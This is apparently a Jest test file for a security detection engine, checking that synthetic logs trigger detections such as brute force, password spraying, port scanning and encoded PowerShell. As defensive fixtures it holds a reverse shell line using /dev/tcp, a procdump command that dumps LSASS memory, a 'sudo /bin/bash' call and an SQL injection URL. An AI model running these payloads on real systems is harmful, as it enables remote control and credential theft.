'use strict';

const { runDetectionEngine } = require('../src/detection-engine/detectionEngine');

function authEvent({ ip, user, outcome, offsetSec }) {
  return {
    '@timestamp': new Date(Date.UTC(2026, 7, 19, 10, 0, offsetSec)).toISOString(),
    source: { ip },
    user: { name: user },
    event: { category: ['authentication'], outcome, action: 'ssh_login' },
  };
}

describe('detectAuthBehaviors via runDetectionEngine', () => {
  test('flags SSH brute force from a single source IP', () => {
    const events = Array.from({ length: 12 }, (_, i) => authEvent({ ip: '198.51.100.5', user: 'admin', outcome: 'failure', offsetSec: i * 5 }));
    const result = runDetectionEngine(events);
    const bruteForce = result.detections.find((d) => d.name.includes('Brute Force'));
    expect(bruteForce).toBeDefined();
    expect(bruteForce.severity).toMatch(/high|critical/);
    expect(bruteForce.mitre.techniqueId).toBe('T1110.001');
  });

  test('flags password spraying against many distinct usernames from one IP', () => {
    const users = ['alice', 'bob', 'carol', 'dave', 'erin', 'frank'];
    const events = users.map((u, i) => authEvent({ ip: '198.51.100.9', user: u, outcome: 'failure', offsetSec: i * 3 }));
    const result = runDetectionEngine(events);
    const spraying = result.detections.find((d) => d.name === 'Password Spraying');
    expect(spraying).toBeDefined();
  });

  test('flags success following repeated failures', () => {
    const events = [
      ...Array.from({ length: 4 }, (_, i) => authEvent({ ip: '203.0.113.9', user: 'root', outcome: 'failure', offsetSec: i * 2 })),
      authEvent({ ip: '203.0.113.9', user: 'root', outcome: 'success', offsetSec: 20 }),
    ];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name.includes('Following Repeated Failures'))).toBeDefined();
  });

  test('does not flag brute force for normal low-volume logins', () => {
    const events = [authEvent({ ip: '10.0.0.5', user: 'jsmith', outcome: 'success', offsetSec: 0 })];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name.includes('Brute Force'))).toBeUndefined();
  });
});

describe('detectLinuxBehaviors via runDetectionEngine', () => {
  test('flags reverse shell command patterns', () => {
    const events = [{ '@timestamp': new Date().toISOString(), message: 'bash -i >& /dev/tcp/203.0.113.55/4444 0>&1' }];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Reverse Shell Indicator')).toBeDefined();
  });

  test('flags suspicious sudo usage', () => {
    const events = [{ '@timestamp': new Date().toISOString(), message: 'sudo /bin/bash' }];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Suspicious sudo Usage')).toBeDefined();
  });
});

describe('detectWindowsBehaviors via runDetectionEngine', () => {
  test('flags encoded PowerShell execution', () => {
    const events = [
      {
        '@timestamp': new Date().toISOString(),
        process: { name: 'powershell.exe', command_line: 'powershell.exe -EncodedCommand SQBFAFgA' },
      },
    ];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Encoded PowerShell Execution')).toBeDefined();
  });

  test('flags credential dumping indicators', () => {
    const events = [{ '@timestamp': new Date().toISOString(), process: { name: 'procdump.exe', command_line: 'procdump -ma lsass.exe lsass.dmp' } }];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Potential Credential Dumping')).toBeDefined();
  });
});

describe('detectWebBehaviors via runDetectionEngine', () => {
  test('flags SQL injection attempts', () => {
    const events = [{ '@timestamp': new Date().toISOString(), url: { original: "/product?id=1' OR '1'='1" }, http: { request: { method: 'GET' } } }];
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'SQL Injection Attempt')).toBeDefined();
  });
});

describe('detectNetworkBehaviors via runDetectionEngine', () => {
  test('flags port scanning from a single source across many ports', () => {
    const events = Array.from({ length: 20 }, (_, i) => ({
      '@timestamp': new Date(Date.UTC(2026, 7, 19, 10, 0, i)).toISOString(),
      source: { ip: '203.0.113.99' },
      destination: { ip: '10.0.0.10', port: 1000 + i * 7 },
    }));
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Port Scanning')).toBeDefined();
  });
});

describe('detectFirewallBehaviors via runDetectionEngine', () => {
  test('flags repeated denied connections', () => {
    const events = Array.from({ length: 15 }, (_, i) => ({
      '@timestamp': new Date(Date.UTC(2026, 7, 19, 10, 0, i)).toISOString(),
      source: { ip: '203.0.113.100' },
      destination: { ip: '10.0.0.11' },
      event: { action: 'denied' },
    }));
    const result = runDetectionEngine(events);
    expect(result.detections.find((d) => d.name === 'Repeated Denied Firewall Connections')).toBeDefined();
  });
});
